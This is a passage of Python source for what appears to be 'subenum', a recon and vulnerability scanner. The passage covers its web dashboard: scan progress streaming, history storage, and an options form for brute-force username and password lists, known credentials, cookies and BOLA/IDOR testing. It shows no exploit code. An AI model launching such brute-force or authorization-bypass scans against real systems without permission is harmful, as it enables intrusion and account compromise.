                    self.phase_idx, self.phase_tok, self.phase_name = i, t, name
                    break
            self.frac = 0.0
            self._recompute()
        elif self.phase_idx >= 0:
            m2 = re.search(r"(?<![\w.])(\d{1,7})/(\d{1,7})(?!\d)", line)
            if m2 and int(m2.group(2)) > 1:
                f = min(1.0, int(m2.group(1)) / int(m2.group(2)))
                if f >= self.frac:              # monotonic inside one phase
                    self.frac = f
                    self._recompute()

    def _recompute(self):
        if self.phase_idx < 0:
            return
        span = 99.0 / len(WEB_PHASES)
        self.progress = round(min(99.0, self.phase_idx * span + self.frac * span), 1)

    def begin(self, targets, argv):
        self.done = False
        self.exit = None
        self.running = True
        self.targets = targets
        self.argv = list(argv)
        self.started = time.time()
        self.ended = 0.0
        self.phase_idx = -1
        self.phase_tok = self.phase_name = ""
        self.frac = self.progress = 0.0
        # nlines stays monotonic across runs - clients use it as a log
        # cursor; resetting it would hide a new run's lines (since=old_n)
        self.lines.clear()
        self.push(f"[*] web scan queued: {targets}")

    def run(self):
        try:
            self.runner(self.argv)
        except BaseException as e:
            _REAL_PRINT(f"[!] web scan crashed: {e}")
            self.push(f"[!] web scan crashed: {e}")
            if self.exit is None:
                self.exit = 1
        finally:
            if self.exit is None:
                self.exit = 0
            self.running = False
            self.done = True
            self.ended = time.time()
            self.progress = 100.0
            self.push("---- scan finished ----")
            _hist_append({
                "ts": self.ended,
                "targets": self.targets,
                "exit": self.exit,
                "elapsed": round(self.ended - (self.started or self.ended), 1),
                "results": _web_results(),
            })


WEB_BUS = WebBus()


def _web_tee(*args, **kwargs):
    """print wrapper: keep console output, also stream it to the web UI."""
    try:
        _REAL_PRINT(*args, **kwargs)
    except Exception:
        pass
    if kwargs.get("file") is None and args:
        try:
            WEB_BUS.push(str(kwargs.get("sep", " ")).join(str(x) for x in args))
        except Exception:
            pass


def _web_install_tee():
    if not _WEB_TEE[0]:
        import builtins
        builtins.print = _web_tee
        _WEB_TEE[0] = True


def _web_clean_target(t):
    t = re.sub(r"^[a-z][a-z0-9+.-]*://", "", str(t).strip().lower())
    return t.split("/")[0].split(":")[0].strip(" \t.,;")


def _web_argv(targets, opts, auth="", cookie="", creds=(), cred_file="",
              brute_users=(), brute_passes=(), proxy="", auth_b="",
              resume=False, sarif=False, junit=False, fail_on="",
              dns_conc=0, http_conc=0, port_conc=0, attack_budget=0,
              max_scan=0, nuclei_sev="", nuclei_rate=0):
    argv = list(targets)
    for key, flag in _WEB_OPT_FLAGS:
        if not opts.get(key, True):
            argv.append(flag)
    if auth:
        argv += ["--authorization", auth]
    if cookie:
        argv += ["--cookie", cookie]
    for c in creds:
        c = str(c).strip()
        if c:
            argv += ["--creds", c]
    if cred_file:
        argv += ["--creds-file", str(cred_file).strip()]
    for u in brute_users:
        u = str(u).strip()
        if u:
            argv += ["--brute-user", u]
    for p in brute_passes:
        p = str(p).strip()
        if p:
            argv += ["--brute-pass", p]
    if proxy:
        argv += ["--proxy", str(proxy).strip()]
    if auth_b:
        argv += ["--auth-b", str(auth_b).strip()]
    if resume:
        argv.append("--resume")
    if sarif:
        argv.append("--sarif")
    if junit:
        argv.append("--junit")
    if fail_on:
        argv += ["--fail-on", str(fail_on).strip()]
    for flag, val in (("--dns-conc", dns_conc), ("--http-conc", http_conc),
                      ("--port-conc", port_conc),
                      ("--attack-budget", attack_budget),
                      ("--max-scan", max_scan), ("--nuclei-rate", nuclei_rate)):
        try:
            val = int(val)
        except (TypeError, ValueError):
            val = 0
        if val:
            argv += [flag, str(val)]
    if nuclei_sev:
        argv += ["--nuclei-sev", str(nuclei_sev).strip()]
    return argv


def _web_stats():
    out = {"subs": 0, "endpoints": 0, "ports": 0, "dirs": 0, "vhosts": 0,
           "findings": 0, "errors": len(CHECK_ERRORS),
           "sev": {"critical": 0, "high": 0, "medium": 0,
                   "low": 0, "info": 0}}
    for k, fn in list(WEB_BUS.probes.items()):
        try:
            v = fn()
            if isinstance(v, int):
                out[k] = v
        except Exception:
            pass
    if WEB_BUS.sevsrc:
        try:
            uniq = set(WEB_BUS.sevsrc())
            out["findings"] = len(uniq)
            for x in uniq:
                s = sev(x)
                out["sev"][s] = out["sev"].get(s, 0) + 1
        except Exception:
            pass
    return out


def _web_state():
    now = time.time()
    return {
        "running": WEB_BUS.running, "done": WEB_BUS.done, "exit": WEB_BUS.exit,
        "targets": WEB_BUS.targets, "started": WEB_BUS.started,
        "ended": WEB_BUS.ended,
        "elapsed": (round((WEB_BUS.ended or now) - WEB_BUS.started, 1)
                    if WEB_BUS.started else 0),
        "phase_idx": WEB_BUS.phase_idx, "phase_tok": WEB_BUS.phase_tok,
        "phase_name": WEB_BUS.phase_name, "progress": WEB_BUS.progress,
        "lines": WEB_BUS.nlines,
        "phases": [{"tok": t, "name": n} for t, n in WEB_PHASES],
    }


def _web_results():
    def rd(name):
        try:
            with open(name, encoding="utf-8", errors="replace") as f:
                return [l.rstrip("\n") for l in f
                        if l.strip() and not l.lstrip().startswith("#")]
        except OSError:
            return []
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    fnd = []
    for x in rd("subdomains_findings.txt"):
        m = re.match(r"\[([A-Z0-9][A-Z0-9-]*)\]", x)
        tag = m.group(1) if m else ""
        fnd.append({"sev": sev(x), "text": x, "tag": tag,
                    "rem": REMEDIATION.get(tag, "")})
    fnd.sort(key=lambda d: order.get(d["sev"], 4))
    return {
        "findings": fnd,
        "sev": dict(Counter(d["sev"] for d in fnd)),
        "subdomains": rd("subdomains.txt"),
        "ports": rd("subdomains_ports.txt"),
        "dirs": rd("subdomains_dirs.txt"),
        "vhosts": rd("subdomains_vhosts.txt"),
        "surface": rd("subdomains_surface.txt"),
        "endpoints": len(rd("subdomains_endpoints.txt")),
        "available": {n: os.path.exists(n) for n in WEB_FILES},
    }


def findings_csv(findings):
    """CSV export rows for findings (severity,finding) with RFC4180 quoting."""
    out = ["severity,finding"]
    for f in findings:
        s = f.get("sev") if isinstance(f, dict) else sev(str(f))
        t = str(f.get("text") if isinstance(f, dict) else f).replace('"', '""')
        out.append(f'"{s}","{t}"')
    return "\r\n".join(out) + "\r\n"


HIST_FILE = ".subenum_history.json"
HIST_MAX = 20


def _hist_read():
    try:
        with open(HIST_FILE, encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []


def _hist_append(entry):
    """append a finished scan snapshot (capped) - atomic tmp+replace so a
    crash mid-write never corrupts the history file."""
    try:
        snaps = (_hist_read() + [entry])[-HIST_MAX:]
        tmp = f"{HIST_FILE}.{os.getpid()}.tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(snaps, f)
        os.replace(tmp, HIST_FILE)
    except OSError:
        pass


def _clear_old_data(base="subdomains"):
    """delete dashboard scan history + previous <out>-derived artifacts so
       the user can reset all old data (CLI --clear-data / UI clear button).
       returns how many files were removed."""
    cands = [HIST_FILE, *sorted(glob.glob(HIST_FILE + ".*"))]
    for suf in ("", ".txt", ".json", ".state.json", "_crawl.txt",
                "_dirs.txt", "_endpoints.txt", "_findings.txt", "_links.txt",
                "_ports.txt", "_report.html", "_surface.txt",
                "_vhosts.txt", "_surface.json"):
        cands.append(base + suf)
    removed = 0
    for f in dict.fromkeys(cands):
        try:
            os.remove(f)
            removed += 1
            print(f"  [clear] removed {f}", flush=True)
        except OSError:
            pass
    return removed


def _web_run_scan(argv):
    """worker: replay a full CLI run (fresh asyncio loop + fresh semaphores)."""
    global DNS_SEM, SYS_SEM, HTTP_SEM, PORT_SEM, DOH_SLOTS
    DNS_SEM = asyncio.Semaphore(300)
    SYS_SEM = asyncio.Semaphore(60)
    HTTP_SEM = asyncio.Semaphore(120)
    PORT_SEM = asyncio.Semaphore(400)
    # DoH slots are loop-bound too: reusing the import-time ones in a new
    # asyncio.run loop raises "bound to a different event loop"
    DOH_SLOTS = [asyncio.Semaphore(DNS_PER_HOST) for _ in DOH]
    FAILS[0] = 0
    CHECK_ERRORS.clear()
    old = sys.argv
    sys.argv = ["subenum.py"] + list(argv)
    code = 0
    try:
        asyncio.run(main())
    except SystemExit as e:
        code = e.code if isinstance(e.code, int) else 0
    except KeyboardInterrupt:
        code = 130
    except BaseException as e:
        _REAL_PRINT(f"[!] scan error: {e}")
        WEB_BUS.push(f"[!] scan error: {e}")
        code = 1
    finally:
        sys.argv = old
        WEB_BUS.exit = code


async def _web_api_start(request):
    if WEB_BUS.running:
        return web.json_response(
            {"ok": False, "error": "a scan is already running"}, status=409)
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"ok": False, "error": "invalid JSON body"},
                                 status=400)
    raw = str(data.get("targets") or "")
    toks = [_web_clean_target(t) for t in re.split(r"[\s,;]+", raw) if t.strip()]
    toks = list(dict.fromkeys(t for t in toks if t))
    if not toks:
        return web.json_response(
            {"ok": False, "error": "enter at least one target (e.g. example.com)"},
            status=400)
    bad = [t for t in toks if not TARGET_RE.fullmatch(t)]
    if bad:
        return web.json_response(
            {"ok": False, "error": f"invalid target(s): {', '.join(bad[:4])}"},
            status=400)
    opts = data.get("opts") or {}
    creds = data.get("creds") or []
    if isinstance(creds, str):
        creds = [creds]
    brute_users = data.get("brute_users") or data.get("brute_user") or []
    if isinstance(brute_users, str):
        brute_users = [brute_users]
    brute_passes = data.get("brute_passes") or data.get("brute_pass") or []
    if isinstance(brute_passes, str):
        brute_passes = [brute_passes]
    argv = _web_argv(toks, opts,
                     str(data.get("authorization") or "").strip(),
                     str(data.get("cookie") or "").strip(),
                     creds=creds,
                     cred_file=str(data.get("creds_file") or "").strip(),
                     brute_users=brute_users,
                     brute_passes=brute_passes,
                     proxy=str(data.get("proxy") or "").strip(),
                     auth_b=str(data.get("auth_b") or "").strip(),
                     resume=bool(data.get("resume")),
                     sarif=bool(data.get("sarif")),
                     junit=bool(data.get("junit")),
                     fail_on=str(data.get("fail_on") or "").strip(),
                     dns_conc=data.get("dns_conc", 0),
                     http_conc=data.get("http_conc", 0),
                     port_conc=data.get("port_conc", 0),
                     attack_budget=data.get("attack_budget", 0),
                     max_scan=data.get("max_scan", 0),
                     nuclei_sev=str(data.get("nuclei_sev") or "").strip(),
                     nuclei_rate=data.get("nuclei_rate", 0))
    if WEB_BUS.runner is None:
        WEB_BUS.runner = _web_run_scan
    WEB_BUS.begin(", ".join(toks), argv)
    threading.Thread(target=WEB_BUS.run, daemon=True).start()
    return web.json_response({"ok": True, "targets": toks,
                              "state": _web_state()})


async def _web_events(request):
    resp = web.StreamResponse(headers={
        "Content-Type": "text/event-stream", "Cache-Control": "no-cache",
        "X-Accel-Buffering": "no"})
    await resp.prepare(request)

    async def send(obj):
        await resp.write(b"data: " + json.dumps(obj, ensure_ascii=False)
                         .encode("utf-8") + b"\n\n")

    try:
        # read state BEFORE lines: a new run's state event must clear the
        # client console before that run's first lines are rendered
        st0, stats0 = _web_state(), _web_stats()
        snap = list(WEB_BUS.lines)[-250:]
        # numbered lines: a (re)connecting client de-dupes against its own
        # cursor instead of re-rendering the same tail on every reconnect
        await send({"t": "snapshot", "state": st0, "stats": stats0,
                    "log": [{"n": n, "text": l} for n, l in snap]})
        cursor = snap[-1][0] if snap else WEB_BUS.nlines
        last_s = json.dumps(st0, sort_keys=True)
        last_m = json.dumps(stats0, sort_keys=True)
        ticks = 0
        while True:
            await asyncio.sleep(0.4)
            ticks += 1
            st = json.dumps(_web_state(), sort_keys=True)
            if st != last_s:                   # state BEFORE log (see above)
                await send({"t": "state", "state": _web_state()})
                last_s = st
            avail = [(n, l) for n, l in WEB_BUS.lines if n > cursor]
            if avail:
                await send({"t": "log", "lines": [l for _, l in avail],
                            "n": avail[-1][0]})
                cursor = avail[-1][0]
            mt = json.dumps(_web_stats(), sort_keys=True)
            if mt != last_m:
                await send({"t": "stats", "stats": _web_stats()})
                last_m = mt
            if ticks % 15 == 0:                # ~6s heartbeat: keeps
                await resp.write(b": ping\n\n")  # proxies/browsers from
                                                  # dropping the stream
    except (ConnectionResetError, ConnectionError, aiohttp.ClientError):
        pass
    return resp


async def _web_api_log(request):
    try:
        since = max(0, int(request.query.get("since", "0")))
    except ValueError:
        since = 0
    return web.json_response({"n": WEB_BUS.nlines,
                              "lines": [l for n, l in WEB_BUS.lines if n > since][-400:],
                              "state": _web_state(), "stats": _web_stats()})


WEBUI_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="color-scheme" content="light">
<title>Subenum - Recon Console</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='13' font-size='13' fill='%23b8860b'>&#9670;</text></svg>">
<style>
:root{
  --green:#059669; --green2:#34d399; --greenbg:#ecfdf5;
  --gold:#b8860b; --gold2:#d4af37; --goldbg:#fdf9ec;
  --ink:#0e1b16; --mut:#5b6b64; --line:#e7ece9; --bg:#f7faf8;
  --crit:#e11d48; --high:#ea580c; --med:#b8860b; --low:#2563eb; --info:#64748b;
}
*{box-sizing:border-box}
html,body{margin:0;padding:0}
body{font:15px/1.5 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
  color:var(--ink);background:
  radial-gradient(1200px 500px at 80% -10%, #eafaf3 0%, transparent 60%),
  radial-gradient(900px 400px at 0% 0%, #fdf9ec 0%, transparent 55%),
  var(--bg)}
.wrap{max-width:1180px;margin:0 auto;padding:0 20px 60px}
header{position:sticky;top:0;z-index:9;backdrop-filter:blur(8px);
  background:rgba(255,255,255,.86);border-bottom:1px solid var(--line);
  box-shadow:0 1px 0 rgba(184,134,11,.25)}
.hbar{display:flex;align-items:center;gap:14px;max-width:1180px;margin:0 auto;padding:14px 20px}
.brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.14em;font-size:14px}
.dia{width:26px;height:26px;border-radius:7px;display:grid;place-items:center;color:#fff;font-size:13px;
  background:linear-gradient(135deg,var(--green),var(--green2) 60%,var(--gold2));
  box-shadow:0 2px 8px rgba(5,150,105,.35)}
.brand b{background:linear-gradient(90deg,var(--green),var(--gold));-webkit-background-clip:text;
  background-clip:text;color:transparent}
.spacer{flex:1}
.pill{display:inline-flex;align-items:center;gap:8px;font-size:12.5px;font-weight:600;
  padding:6px 13px;border-radius:999px;border:1px solid var(--line);background:#fff;color:var(--mut)}
.pill .dot{width:8px;height:8px;border-radius:50%;background:#cbd5e1}
.pill.run{border-color:#a7f3d0;color:#047857;background:var(--greenbg)}
.pill.run .dot{background:var(--green2);animation:pulse 1.1s infinite}
.pill.ok{border-color:#f5e4b0;color:#8a6d1d;background:var(--goldbg)}
.pill.ok .dot{background:var(--gold2)}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.35;transform:scale(.75)}}
.ghost{border:1px solid var(--line);background:#fff;color:var(--mut);border-radius:9px;
  padding:7px 13px;font-size:13px;font-weight:600;cursor:pointer;transition:.15s}
.ghost:hover{border-color:var(--gold2);color:var(--gold);box-shadow:0 0 0 3px var(--goldbg)}
.btn{border:1px solid rgba(184,134,11,.55);background:linear-gradient(135deg,var(--green),#047857);
  color:#fff;font-weight:700;font-size:15px;padding:11px 26px;border-radius:11px;cursor:pointer;
  letter-spacing:.02em;box-shadow:0 6px 18px rgba(5,150,105,.3);transition:.18s}
.btn:hover{transform:translateY(-1px);box-shadow:0 10px 24px rgba(184,134,11,.35);
  background:linear-gradient(135deg,#047857,var(--green))}
.btn[disabled]{opacity:.55;cursor:not-allowed;transform:none}
h1{font-size:44px;line-height:1.08;margin:44px 0 8px;font-weight:800;letter-spacing:-.02em}
h1 span{background:linear-gradient(90deg,var(--green),var(--gold2));
  -webkit-background-clip:text;background-clip:text;color:transparent}
.sub{color:var(--mut);font-size:16.5px;margin:0 0 26px;max-width:640px}
.card{background:#fff;border:1px solid var(--line);border-radius:16px;padding:22px;
  box-shadow:0 8px 28px rgba(14,27,22,.06);margin-bottom:22px;animation:up .4s ease}
@keyframes up{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
label{display:block;font-size:12px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;
  color:var(--mut);margin-bottom:8px}
textarea{width:100%;min-height:74px;resize:vertical;border:1.5px solid var(--line);border-radius:12px;
  padding:13px 15px;font:14.5px/1.5 ui-monospace,Consolas,monospace;color:var(--ink);background:#fcfefd}
#targets{width:100%;border:1.5px solid var(--line);border-radius:12px;padding:13px 15px;
  font:15px ui-monospace,Consolas,monospace;color:var(--ink);background:#fcfefd}
textarea:focus,input:focus{outline:none;border-color:var(--green2);box-shadow:0 0 0 4px rgba(52,211,153,.18)}
.row{display:flex;gap:14px;flex-wrap:wrap;align-items:flex-end}
.fld{flex:1;min-width:240px}
.fld input{width:100%;border:1.5px solid var(--line);border-radius:11px;padding:11px 13px;
  font:14px ui-monospace,Consolas,monospace;background:#fcfefd}
.segs{display:flex;gap:8px;margin-top:16px}
.seg{flex:1;border:1.5px solid var(--line);background:#fff;border-radius:12px;padding:12px 8px;
  cursor:pointer;text-align:center;transition:.15s}
.seg b{display:block;font-size:14.5px}
.seg i{font-style:normal;font-size:12px;color:var(--mut)}
.seg.on{border-color:var(--green);background:var(--greenbg);box-shadow:0 0 0 3px rgba(5,150,105,.12)}
.seg.on b{color:#047857}
.adv{margin-top:16px;border-top:1px dashed var(--line);padding-top:12px}
.adv summary{cursor:pointer;font-size:13px;font-weight:700;color:var(--gold);letter-spacing:.04em}
.opts{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:8px;margin-top:12px}
.opt{display:flex;gap:8px;align-items:center;font-size:13.5px;color:#33443d;
  background:#fcfefd;border:1px solid var(--line);border-radius:9px;padding:8px 10px;cursor:pointer}
.opt input{accent-color:var(--green);width:15px;height:15px;cursor:pointer}
.err{color:var(--crit);font-size:13.5px;font-weight:600;margin-top:10px;min-height:18px}
.progress{height:14px;border-radius:999px;background:#eef3f0;overflow:hidden;position:relative;
  border:1px solid var(--line)}
.fill{height:100%;border-radius:999px;background:linear-gradient(90deg,var(--green),var(--green2) 55%,var(--gold2));
  transition:width .5s ease;position:relative}
.fill::after{content:"";position:absolute;inset:0;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,.55),transparent);
  animation:shim 1.6s infinite}
@keyframes shim{from{transform:translateX(-100%)}to{transform:translateX(100%)}}
.pmeta{display:flex;justify-content:space-between;font-size:13px;color:var(--mut);margin-top:8px}
.pmeta b{color:var(--ink)}
.phases{display:flex;gap:7px;flex-wrap:wrap;margin-top:16px}
.tok{font:11.5px ui-monospace,Consolas,monospace;border:1px solid var(--line);background:#fff;
  color:#9aa8a2;border-radius:999px;padding:4px 11px;transition:.2s;white-space:nowrap}
.tok.past{border-color:#f0e2ae;color:var(--gold);background:var(--goldbg)}
.tok.on{border-color:var(--green);background:var(--green);color:#fff;font-weight:700;
  box-shadow:0 3px 10px rgba(5,150,105,.4)}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px}
.stat{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 16px 13px;
  position:relative;overflow:hidden}
.stat::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;
  background:linear-gradient(180deg,var(--green2),var(--gold2))}
.stat .n{font-size:30px;font-weight:800;letter-spacing:-.02em;line-height:1.1}
.stat .l{font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--mut);
  margin-top:3px}
.chips{display:flex;gap:7px;flex-wrap:wrap;margin-top:14px}
.chip{font-size:11.5px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;
  border-radius:999px;padding:4px 11px;border:1px solid transparent;cursor:pointer;
  font-family:inherit}
.chip.on{box-shadow:0 0 0 2px var(--ink)}
.resbtns{float:right;display:flex;gap:7px;font-weight:600;text-transform:none;
  letter-spacing:0}
.resbtns a{text-decoration:none;padding:6px 13px}
.histrow{display:flex;gap:14px;align-items:baseline;width:100%;text-align:left;
  background:#fff;border:1px solid var(--line);border-radius:10px;padding:10px 13px;
  margin-top:9px;cursor:pointer;font-size:13.5px}
.histrow:hover{border-color:var(--green2);background:#fcfefd}
.histrow b{color:var(--ink)}
.histrow span{color:var(--mut);font-size:12px}
.findbox{background:#0e1d18;border:1px solid #17352b;color:#cfe8dc;
  border-radius:8px;padding:5px 9px;font-size:12px;width:190px}
.findbox:focus{outline:none;border-color:var(--green2)}
.findn{color:#7fb8a4;font-size:11.5px;font-weight:700;min-width:52px;
  text-align:right;margin-right:2px}
.ln.dim{opacity:.22}
.ln.crit{background:rgba(255,72,100,.10);border-left:2px solid #ff4864;
  padding-left:5px;margin-left:-7px}
.ln.jmp{background:rgba(52,211,153,.14);box-shadow:0 0 0 1px var(--green2)}
.frow{cursor:pointer}
.frow:hover{background:#f6fbf9}
.evbox{background:#f8fafc;border:1px solid var(--line);border-radius:10px;
  padding:12px 14px;margin:6px 0 10px;font-size:13px;line-height:1.55}
.evbox .evtag{display:flex;gap:9px;align-items:center;margin-bottom:7px}
.evbox code{background:#eef2f1;border:1px solid var(--line);border-radius:6px;
  padding:1px 7px;font-size:12px}
.evbox .evrem{margin-bottom:6px;color:var(--ink)}
.evbox .evproof{color:var(--mut);font-family:ui-monospace,Consolas,monospace;
  font-size:12px;word-break:break-all;margin-bottom:9px}
.evbox .evout{background:#0b1512;color:#9fe8cf;border-radius:8px;padding:10px;
  font-size:11.5px;max-height:260px;overflow:auto;white-space:pre-wrap;
  word-break:break-all;margin-top:9px}
.s-critical{background:#ffe4e9;color:var(--crit);border-color:#fecdd3}
.s-high{background:#fff1e6;color:var(--high);border-color:#fed7aa}
.s-medium{background:var(--goldbg);color:var(--gold);border-color:#f3e3ad}
.s-low{background:#e6efff;color:var(--low);border-color:#c7d7fe}
.s-info{background:#f1f5f9;color:var(--info);border-color:#e2e8f0}
.console{background:#0b1512;border:1px solid #17352b;border-radius:16px;overflow:hidden;
  box-shadow:0 14px 34px rgba(4,20,14,.35)}
.chead{display:flex;align-items:center;gap:10px;padding:11px 16px;background:#0e1d18;
  border-bottom:1px solid #17352b}
.chead b{color:#9ff0c4;font:12.5px ui-monospace,Consolas,monospace;letter-spacing:.12em;text-transform:uppercase}
.led{width:9px;height:9px;border-radius:50%;background:#1f4d3d}
.led.g{background:var(--green2);box-shadow:0 0 8px var(--green2)}
.cbody{height:340px;overflow:auto;padding:14px 16px;
  font:12.5px/1.7 ui-monospace,Consolas,"Courier New",monospace;color:#8fe6bd;white-space:pre-wrap;
  word-break:break-all}
.cbody .ph{color:var(--gold2);font-weight:700}
.cbody .sv-critical{color:#ff8fa3;font-weight:700}
.cbody .sv-high{color:#ffb26b;font-weight:700}
.cbody .sv-medium{color:#ffd97a}
.cbody .sv-low{color:#7cf0b2}
.cbody .sv-info{color:#94a3b8}
.cbody .er{color:#ff8fa3;font-weight:700}
.cbody .ln:hover{background:rgba(159,240,196,.07)}
.tabs{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:14px}
.tab{border:1.5px solid var(--line);background:#fff;border-radius:999px;padding:7px 16px;
  font-size:13.5px;font-weight:700;color:var(--mut);cursor:pointer;transition:.15s}
.tab:hover{border-color:var(--green2);color:var(--green)}
.tab.on{background:var(--green);border-color:var(--green);color:#fff;box-shadow:0 4px 12px rgba(5,150,105,.3)}
.tbl{border:1px solid var(--line);border-radius:12px;overflow:hidden}
.tr{display:flex;gap:12px;align-items:flex-start;padding:10px 14px;border-bottom:1px solid var(--line);
  font-size:13.5px}
.tr:last-child{border-bottom:none}
.tr:nth-child(odd){background:#fbfdfc}
.ft{font-family:ui-monospace,Consolas,monospace;font-size:13px;color:#24352e;word-break:break-all}
.list{max-height:420px;overflow:auto;border:1px solid var(--line);border-radius:12px}
.li{padding:8px 14px;border-bottom:1px solid var(--line);font:13px ui-monospace,Consolas,monospace}
.li:last-child{border:none}
.dl{display:inline-block;margin:0 10px 10px 0;padding:8px 15px;border-radius:10px;font-size:13.5px;
  font-weight:700;text-decoration:none;color:#047857;background:var(--greenbg);
  border:1px solid #a7f3d0}
.dl:hover{border-color:var(--green);box-shadow:0 3px 10px rgba(5,150,105,.2)}
.empty{color:var(--mut);font-size:13.5px;padding:22px;text-align:center;
  border:1.5px dashed var(--line);border-radius:12px;background:#fcfefd}
.h2{font-size:13px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--mut);
  margin:0 0 14px;display:flex;align-items:center;gap:10px}
.h2::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,var(--line),transparent)}
.card[hidden]{display:none}
footer{text-align:center;color:#93a49d;font-size:12.5px;padding:26px 0 8px}
@media (max-width:720px){h1{font-size:32px}.cbody{height:260px}}
</style>
</head>
<body>
<header><div class="hbar">
  <div class="brand"><div class="dia">&#9670;</div><b>SUBENUM</b>
    <span style="color:var(--mut);font-weight:600;letter-spacing:.04em">/ recon console</span></div>
  <div class="spacer"></div>
  <span class="pill" id="pill"><span class="dot"></span><span id="pillTxt">idle</span></span>
  <span class="pill" id="elapsed">0s</span>
  <button class="ghost" id="btnNew" hidden title="start another scan">&#43; new scan</button>
  <button class="ghost" id="btnRefresh" title="re-read result files">&#8635; refresh</button>
</div></header>

<div class="wrap">
  <!-- LAUNCH -->
  <section id="viewLaunch">
    <h1>See <span>everything.</span><br>Miss nothing.</h1>
    <p class="sub">Enter a domain, hit Start - all 19 phases run automatically,
       evidence only, zero noise. Live progress streams below.</p>
    <div class="card">
      <label for="targets">Target domain</label>
      <input id="targets" spellcheck="false" placeholder="example.com">
      <details class="adv">
        <summary>&#9881; options (optional - defaults are automatic)</summary>
        <div class="row" style="margin-top:10px">
          <div class="fld">
            <label for="authz">Authorization header</label>
            <input id="authz" placeholder="Bearer eyJhbGciOi..." spellcheck="false">
          </div>
          <div class="fld">
            <label for="ck">Cookie</label>
            <input id="ck" placeholder="sid=abc; token=xyz" spellcheck="false">
          </div>
        </div>
        <div class="row" style="margin-top:10px">
          <div class="fld">
            <label for="credPairs">Known creds (one <code>user:pass</code> per line)</label>
            <textarea id="credPairs" rows="2" spellcheck="false"
              placeholder="admin:S3cret&#10;root:hunter2"></textarea>
          </div>
        </div>
        <div class="row" style="margin-top:10px">
          <div class="fld">
            <label for="bruteU">Brute usernames (one per line)</label>
            <textarea id="bruteU" rows="2" spellcheck="false"
              placeholder="admin&#10;root"></textarea>
          </div>
          <div class="fld">
            <label for="bruteP">Brute passwords (one per line)</label>
            <textarea id="bruteP" rows="2" spellcheck="false"
              placeholder="password&#10;123456"></textarea>
          </div>
        </div>
        <div class="row" style="margin-top:10px">
          <div class="fld">
            <label for="authB">2nd account auth (for BOLA/IDOR matrix)</label>
            <input id="authB" placeholder="Bearer eyJhbGciOi..." spellcheck="false">
          </div>
          <div class="fld">
            <label for="proxy">Proxy</label>
            <input id="proxy" placeholder="http://127.0.0.1:8080" spellcheck="false">
          </div>
        </div>
        <div class="row" style="margin-top:10px">
          <div class="fld">
            <label for="failOn">Fail CI on severity</label>
            <select id="failOn">
              <option value="">off</option>
              <option value="critical">critical</option>
              <option value="high">high</option>
              <option value="medium">medium</option>
              <option value="low">low</option>
            </select>
          </div>
          <div class="fld">
            <label for="nucleiSev">Nuclei severity</label>
            <input id="nucleiSev" placeholder="critical,high,medium" spellcheck="false">
          </div>
        </div>
        <div class="row" style="margin-top:10px">
          <label class="opt"><input type="checkbox" id="optResume"> resume from last checkpoint</label>
          <label class="opt"><input type="checkbox" id="optSarif"> export SARIF</label>
          <label class="opt"><input type="checkbox" id="optJunit"> export JUnit</label>
        </div>
        <div class="row" style="margin-top:10px">
          <div class="fld">
            <label for="dnsConc">DNS concurrency</label>
            <input id="dnsConc" type="number" min="0" placeholder="0 = default">
          </div>
          <div class="fld">
            <label for="httpConc">HTTP concurrency</label>
            <input id="httpConc" type="number" min="0" placeholder="0 = default">
          </div>
          <div class="fld">
            <label for="portConc">Port concurrency</label>
            <input id="portConc" type="number" min="0" placeholder="0 = default">
          </div>
        </div>
        <div class="segs">
          <div class="seg on" data-p="full"><b>Full</b><i>all 19 phases</i></div>
          <div class="seg" data-p="quick"><b>Quick</b><i>verify / probe / ports / CVE</i></div>
        </div>
        <div class="opts" id="opts"></div>
      </details>
      <div class="err" id="err"></div>
      <div style="margin-top:8px">
        <button class="btn" id="btnStart">&#9654; Start scan</button>
      </div>
    </div>
    <div class="card" id="histCard" hidden>
      <div class="h2">Recent scans <button class="ghost" id="btnClrHist"
        title="delete saved scan history and old result files">&#10005; clear data</button></div>
      <div id="histList"></div>
    </div>
  </section>

  <!-- LIVE -->
  <section id="viewLive" hidden>
    <div class="card">
      <div class="h2">Scan progress</div>
      <div class="progress"><div class="fill" id="fill" style="width:0%"></div></div>
      <div class="pmeta">
        <span id="phLabel">waiting for first phase&hellip;</span>
        <span><b id="pct">0%</b> &middot; <span id="tgtLine"></span></span>
      </div>
      <div class="phases" id="phases"></div>
    </div>
    <div class="card">
      <div class="h2">Live counters</div>
      <div class="stats" id="stats"></div>
      <div class="chips" id="sevchips"></div>
    </div>
    <div class="console">
      <div class="chead"><span class="led" id="led"></span><b>console</b>
        <div class="spacer"></div>
        <input id="logFind" class="findbox" spellcheck="false"
          placeholder="filter log… critical, svc-, http://">
        <span id="findN" class="findn"></span>
        <button class="ghost" id="findPrev" title="previous match">&#9650;</button>
        <button class="ghost" id="findNext" title="next match">&#9660;</button>
        <button class="ghost" id="btnClear"
          style="background:transparent;border-color:#17352b;color:#7fb8a4">clear</button></div>
      <div class="cbody" id="console"></div>
    </div>
  </section>

  <!-- RESULTS -->
  <section class="card" id="resultsCard" hidden>
    <div class="h2">Results <span id="resMeta" style="font-weight:600;text-transform:none;
      letter-spacing:0;font-size:12.5px"></span>
      <span class="resbtns">
